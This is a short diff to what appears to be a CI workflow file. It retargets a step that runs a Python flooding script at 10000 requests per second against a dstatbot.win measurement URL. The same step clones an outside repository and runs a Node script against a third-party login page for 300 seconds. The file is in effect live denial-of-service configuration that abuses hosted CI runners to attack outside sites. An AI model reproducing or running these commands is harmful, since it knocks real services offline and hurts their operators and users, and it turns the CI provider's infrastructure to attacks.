@@ -43,7 +43,7 @@ jobs:
       
       - name: Clone repository and run m.js
         run: |
-          python3 m.py --url https://c1.dstatbot.win/6N7fhkPX --rps 10000 --workers 200 --connections 100 --max-concurrency 15000 --duration 340 
+          python3 m.py --url https://c3.dstatbot.win/5scNRn42 --rps 10000 --workers 20 --connections 100 --max-concurrency 15000 --duration 340 
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
           node m.js https://dominator.ai-new.xyz/login 300 1 1 2
